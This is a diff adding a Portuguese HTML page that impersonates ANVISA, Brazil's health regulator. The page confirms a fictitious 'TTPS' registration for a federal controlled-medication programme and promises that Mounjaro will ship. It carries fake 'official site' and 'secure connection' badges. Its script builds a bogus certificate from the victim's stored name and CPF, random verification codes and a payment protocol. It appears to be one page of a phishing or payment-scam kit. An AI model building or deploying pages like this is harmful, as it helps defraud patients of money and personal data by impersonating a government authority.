@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Registro TTPS Concluído | ANVISA</title>
+  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 8px;
+    }
+    
+    .subtitle {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 24px;
+    }
+    
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 50;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .secure-badge {
+      display: inline-flex;
+      align-items: center;
+      background-color: #f0f7ff;
+      color: #1351b4;
+      padding: 6px 12px;
+      border-radius: 16px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    
+    .success-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+      text-align: center;
+    }
+    
+    .success-header {
+      background-color: #dcfce7;
+      padding: 20px;
+      border-bottom: 1px solid #bbf7d0;
+    }
+    
+    .success-content {
+      padding: 40px 30px;
+    }
+    
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      background-color: #dcfce7;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+    }
+    
+    .success-icon i {
+      font-size: 40px;
+      color: #16a34a;
+    }
+    
+    .success-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #16a34a;
+      margin-bottom: 12px;
+    }
+    
+    .success-subtitle {
+      font-size: 16px;
+      color: #4b5563;
+      margin-bottom: 24px;
+    }
+    
+    .registration-details {
+      background-color: #f9fafb;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      border: 1px solid #e5e7eb;
+      text-align: left;
+    }
+    
+    .registration-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 12px;
+    }
+    
+    .registration-row {
+      display: flex;
+      margin-bottom: 8px;
+    }
+    
+    .registration-label {
+      width: 40%;
+      font-size: 14px;
+      color: #6b7280;
+    }
+    
+    .registration-value {
+      width: 60%;
+      font-size: 14px;
+      font-weight: 500;
+      color: #4b5563;
+    }
+    
+    .info-box {
+      background-color: #eff6ff;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+      border: 1px solid #bfdbfe;
+      border-left: 4px solid #3b82f6;
+      text-align: left;
+    }
+    
+    .info-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .info-title i {
+      margin-right: 8px;
+      color: #3b82f6;
+    }
+    
+    .info-text {
+      font-size: 14px;
+      color: #4b5563;
+      line-height: 1.5;
+    }
+    
+    .next-steps {
+      margin-top: 24px;
+      padding-top: 24px;
+      border-top: 1px solid #e5e7eb;
+    }
+    
+    .next-steps-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+    }
+    
+    .steps-list {
+      text-align: left;
+      margin-bottom: 24px;
+    }
+    
+    .step-item {
+      display: flex;
+      margin-bottom: 16px;
+    }
+    
+    .step-number {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: #1351b4;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 600;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    .step-content {
+      font-size: 14px;
+      color: #4b5563;
+    }
+    
+    .step-content h4 {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1f2937;
+      margin-bottom: 4px;
+    }
+    
+    .btn {
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+    
+    .btn-primary {
+      background-color: #1351b4;
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: #0c3d8a;
+    }
+    
+    .btn i {
+      margin-right: 8px;
+    }
+    
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    
+    .certificate-box {
+      border: 2px dashed #bfdbfe;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      background-color: #f8fafc;
+      position: relative;
+    }
+    
+    .certificate-stamp {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
+      width: 100px;
+      height: 100px;
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/3/36/RubberStamp_DRAFT.svg');
+      background-size: contain;
+      background-repeat: no-repeat;
+      opacity: 0.6;
+      transform: rotate(-15deg);
+    }
+    
+    .certificate-header {
+      text-align: center;
+      margin-bottom: 20px;
+      border-bottom: 1px solid #e5e7eb;
+      padding-bottom: 20px;
+    }
+    
+    .certificate-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 4px;
+    }
+    
+    .certificate-subtitle {
+      font-size: 14px;
+      color: #6b7280;
+    }
+    
+    .certificate-body {
+      margin-bottom: 20px;
+    }
+    
+    .certificate-text {
+      font-size: 14px;
+      color: #4b5563;
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+    
+    .certificate-info {
+      margin-top: 16px;
+    }
+    
+    .certificate-row {
+      display: flex;
+      margin-bottom: 8px;
+    }
+    
+    .certificate-label {
+      width: 40%;
+      font-size: 14px;
+      font-weight: 600;
+      color: #4b5563;
+    }
+    
+    .certificate-value {
+      width: 60%;
+      font-size: 14px;
+      color: #4b5563;
+    }
+    
+    .certificate-footer {
+      margin-top: 30px;
+      text-align: center;
+      font-size: 12px;
+      color: #6b7280;
+    }
+    
+    .certificate-validation {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 8px;
+    }
+    
+    .certificate-qr {
+      width: 80px;
+      height: 80px;
+      background-color: #e5e7eb;
+      margin-right: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      color: #6b7280;
+    }
+    
+    .certificate-code {
+      font-family: monospace;
+      font-size: 12px;
+      color: #4b5563;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="/ttps">Taxa TTPS</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Registro Concluído</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Registro TTPS Concluído
+      </h2>
+      <p class="subtitle">
+        Seu registro no Programa Federal de Pacientes Tarja Preta foi concluído com sucesso
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-check-circle"></i> Registro Confirmado</span>
+    </div>
+    
+    <div class="success-container">
+      <div class="success-header">
+        <h3 class="text-lg font-semibold text-[#166534]">Registro TTPS Confirmado</h3>
+      </div>
+      
+      <div class="success-content">
+        <div class="success-icon">
+          <i class="fas fa-check"></i>
+        </div>
+        
+        <h2 class="success-title">Registro Concluído com Sucesso!</h2>
+        <p class="success-subtitle">Seu cadastro no Programa Federal de Pacientes Tarja Preta foi finalizado. Seu medicamento será liberado para envio.</p>
+        
+        <div class="certificate-box">
+          <div class="certificate-header">
+            <h3 class="certificate-title">CERTIFICADO DE REGISTRO TTPS</h3>
+            <p class="certificate-subtitle">Programa Federal de Pacientes Tarja Preta</p>
+          </div>
+          
+          <div class="certificate-body">
+            <p class="certificate-text">
+              Este documento certifica que o paciente abaixo está devidamente registrado no Programa Federal de Pacientes Tarja Preta, conforme exigido pela Resolução RDC 445/2025 da ANVISA.
+            </p>
+            
+            <div class="certificate-info">
+              <div class="certificate-row">
+                <div class="certificate-label">Número de Registro:</div>
+                <div class="certificate-value" id="registrationNumber">TTPS-25427891</div>
+              </div>
+              
+              <div class="certificate-row">
+                <div class="certificate-label">Data de Emissão:</div>
+                <div class="certificate-value" id="issueDate">27/04/2025</div>
+              </div>
+              
+              <div class="certificate-row">
+                <div class="certificate-label">Data de Validade:</div>
+                <div class="certificate-value" id="expiryDate">27/04/2026</div>
+              </div>
+              
+              <div class="certificate-row">
+                <div class="certificate-label">Nome:</div>
+                <div class="certificate-value" id="patientName">Nome do Paciente</div>
+              </div>
+              
+              <div class="certificate-row">
+                <div class="certificate-label">CPF:</div>
+                <div class="certificate-value" id="patientCPF">XXX.XXX.XXX-XX</div>
+              </div>
+            </div>
+          </div>
+          
+          <div class="certificate-footer">
+            <p>Este documento é válido em todo o território nacional durante o período de validade indicado.</p>
+            <div class="certificate-validation">
+              <div class="certificate-qr">
+                QR Code
+              </div>
+              <div>
+                <p>Código de Verificação:</p>
+                <p class="certificate-code" id="verificationCode">ANVTTPS-8A54-F832-9C17</p>
+              </div>
+            </div>
+          </div>
+          
+          <div class="certificate-stamp"></div>
+        </div>
+        
+        <div class="info-box">
+          <h4 class="info-title">
+            <i class="fas fa-info-circle"></i> Informações Importantes
+          </h4>
+          <p class="info-text">
+            Seu registro TTPS tem validade de 12 meses a partir da data de emissão. Para renovação, acesse o Portal da ANVISA com 30 dias de antecedência. Este registro é necessário para a aquisição de medicamentos controlados através dos canais oficiais.
+          </p>
+        </div>
+        
+        <div class="registration-details">
+          <h4 class="registration-title">Detalhes do Registro</h4>
+          
+          <div class="registration-row">
+            <div class="registration-label">Tipo de Registro:</div>
+            <div class="registration-value">Programa Federal de Pacientes Tarja Preta</div>
+          </div>
+          
+          <div class="registration-row">
+            <div class="registration-label">Medicamento Vinculado:</div>
+            <div class="registration-value">Mounjaro (Tirzepatida) 5mg</div>
+          </div>
+          
+          <div class="registration-row">
+            <div class="registration-label">Status:</div>
+            <div class="registration-value">Ativo</div>
+          </div>
+          
+          <div class="registration-row">
+            <div class="registration-label">Protocolo de Pagamento:</div>
+            <div class="registration-value" id="paymentProtocol">TTPS-2704-XXXX</div>
+          </div>
+        </div>
+        
+        <div class="next-steps">
+          <h3 class="next-steps-title">Próximos Passos</h3>
+          
+          <div class="steps-list">
+            <div class="step-item">
+              <div class="step-number">1</div>
+              <div class="step-content">
+                <h4>Liberação do Medicamento</h4>
+                <p>Seu medicamento Mounjaro (Tirzepatida) 5mg foi liberado para envio e será preparado nas próximas 24 horas.</p>
+              </div>
+            </div>
+            
+            <div class="step-item">
+              <div class="step-number">2</div>
+              <div class="step-content">
+                <h4>Acompanhamento do Envio</h4>
+                <p>Você receberá um e-mail com as informações de rastreamento assim que o medicamento for despachado.</p>
+              </div>
+            </div>
+            
+            <div class="step-item">
+              <div class="step-number">3</div>
+              <div class="step-content">
+                <h4>Recebimento</h4>
+                <p>Ao receber o produto, verifique se a embalagem está intacta e armazene o medicamento conforme as instruções.</p>
+              </div>
+            </div>
+          </div>
+          
+          <div class="flex justify-center mt-6">
+            <a href="/compra_sucesso" class="btn btn-primary">
+              <i class="fas fa-check-circle"></i> Finalizar
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Elementos
+      const registrationNumberElement = document.getElementById('registrationNumber');
+      const issueDateElement = document.getElementById('issueDate');
+      const expiryDateElement = document.getElementById('expiryDate');
+      const patientNameElement = document.getElementById('patientName');
+      const patientCPFElement = document.getElementById('patientCPF');
+      const verificationCodeElement = document.getElementById('verificationCode');
+      const paymentProtocolElement = document.getElementById('paymentProtocol');
+      
+      // Função para gerar número de registro
+      function generateRegistrationNumber() {
+        const prefix = "TTPS-";
+        const year = "25";
+        const randomNumber = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
+        return prefix + year + randomNumber;
+      }
+      
+      // Função para gerar código de verificação
+      function generateVerificationCode() {
+        const prefix = "ANVTTPS-";
+        const parts = [];
+        for (let i = 0; i < 3; i++) {
+          parts.push(Math.random().toString(16).substring(2, 6).toUpperCase());
+        }
+        return prefix + parts.join('-');
+      }
+      
+      // Função para formatar CPF
+      function formatCPF(cpf) {
+        if (!cpf) return 'XXX.XXX.XXX-XX';
+        cpf = cpf.replace(/\D/g, '');
+        if (cpf.length !== 11) return cpf;
+        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+      }
+      
+      // Obter dados do armazenamento local
+      const storedName = localStorage.getItem('nomeCompleto') || sessionStorage.getItem('client_name');
+      const storedCPF = localStorage.getItem('cpfValidado') || sessionStorage.getItem('client_cpf');
+      
+      // Gerar datas
+      const today = new Date();
+      const issueDate = today.toLocaleDateString('pt-BR');
+      
+      const expiryDate = new Date(today);
+      expiryDate.setFullYear(expiryDate.getFullYear() + 1);
+      const formattedExpiryDate = expiryDate.toLocaleDateString('pt-BR');
+      
+      // Atualizar elementos na página
+      if (registrationNumberElement) {
+        registrationNumberElement.textContent = generateRegistrationNumber();
+      }
+      
+      if (issueDateElement) {
+        issueDateElement.textContent = issueDate;
+      }
+      
+      if (expiryDateElement) {
+        expiryDateElement.textContent = formattedExpiryDate;
+      }
+      
+      if (patientNameElement) {
+        patientNameElement.textContent = storedName || 'Nome do Paciente';
+      }
+      
+      if (patientCPFElement) {
+        patientCPFElement.textContent = formatCPF(storedCPF) || 'XXX.XXX.XXX-XX';
+      }
+      
+      if (verificationCodeElement) {
+        verificationCodeElement.textContent = generateVerificationCode();
+      }
+      
+      // Pegar o protocolo de pagamento do localStorage ou gerar um novo
+      if (paymentProtocolElement) {
+        const storedProtocol = localStorage.getItem('ttps_protocol');
+        if (storedProtocol) {
+          paymentProtocolElement.textContent = storedProtocol;
+        } else {
+          const date = new Date();
+          const day = date.getDate().toString().padStart(2, '0');
+          const month = (date.getMonth() + 1).toString().padStart(2, '0');
+          const randomID = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
+          paymentProtocolElement.textContent = `TTPS-${day}${month}-${randomID}`;
+        }
+      }
+    });
+    
+    // Efeito de scroll na barra de navegação
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
